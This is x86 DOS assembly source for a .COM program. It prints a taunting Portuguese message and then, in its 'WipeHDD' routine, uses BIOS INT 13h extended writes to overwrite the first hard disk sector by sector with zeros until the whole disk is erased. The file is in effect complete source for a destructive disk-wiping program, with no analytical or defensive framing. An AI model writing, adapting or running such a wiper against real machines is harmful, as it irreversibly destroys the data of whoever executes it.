org 100h
MOV AH,9
MOV DX,SALADAO_TA_O_BICHO
INT 21H
call GetDiskPar
;push es
Start:
mov eax,4000h
mov es,ax
es
cmp dword[10h],0
jle End1
call WipeHDD
mov eax,60H
ss
add dword[SETOR],eax
es
sub dword[10h],60H
jmp Start
End1:
;pop es
ret
WipeHDD:
mov eax,0
mov ecx,3000H
push es
mov esi,4000h
mov es,si
mov edi,600h
rep stosd
pop es
mov al,10h
mov si,300h
mov al,10h
mov [si],al
mov al,0h
mov [si+1],al
mov al,60H
mov [si+2],al
mov al,0h
mov [si+3],al
mov ax,600h
mov [si+4],ax
mov ax,4000h
mov [si+6],ax
ss
mov eax,[SETOR]  ;SETOR A SER GRAVADO
mov [si+8],eax
xor ax,ax
mov [si+0ch],ax
mov [si+0eh],ax
mov ah,43h
mov dl,80h
INT 13h
ret

GetDiskPar:
mov ah,48h
mov dl,80h
push ds
mov bx,4000h
mov ds,bx
xor si,si
INT 13h
pop ds
ret
SETOR DD 0
SALADAO_TA_O_BICHO DB 'TU TA O BICHO O SALADAO!!!',13,10
DB 'SALADAO TA O BICHO, HEIN!!!???',13,10
DB 'EH UM PICAO DEDAO RIDICULO$',$0